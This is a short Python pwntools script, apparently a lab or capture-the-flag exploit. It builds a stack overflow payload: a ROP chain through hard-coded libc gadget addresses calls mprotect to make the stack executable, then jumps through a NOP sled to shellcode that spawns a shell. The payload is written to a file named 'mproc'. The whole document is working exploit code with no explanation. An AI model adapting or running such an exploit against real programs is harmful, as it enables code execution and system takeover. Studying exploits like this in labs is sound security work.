from struct import *
from pwn import *

base = 0x7ffff7dd7000
rdi = 0x27c3d + base
rax = 0x3f928 + base
rsi = 0x02940f + base
rdx = 0xcaa2d + base
sysc = 0x58dba + base
context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())
payload = b''
payload += b'\x90' * 22
payload += struct.pack('<Q', rax)
payload += struct.pack('<Q', 0xa)
payload += struct.pack('<Q', rdi)
payload += struct.pack('<Q', 0x7ffffffdd000)
payload += struct.pack('<Q', rsi)
payload += struct.pack('<Q', 0x22000)
payload += struct.pack('<Q', rdx)
payload += struct.pack('<Q', 0x7)
payload += struct.pack('<Q', sysc)
payload += struct.pack('<Q', 0x7fffffffdab8 + 0x170)
payload += b'\x90' * 270
payload += shellcode
payload += b'\x90' * 10
payload += asm(shellcraft.exit())
file = open("mproc", "wb")
file.write(payload)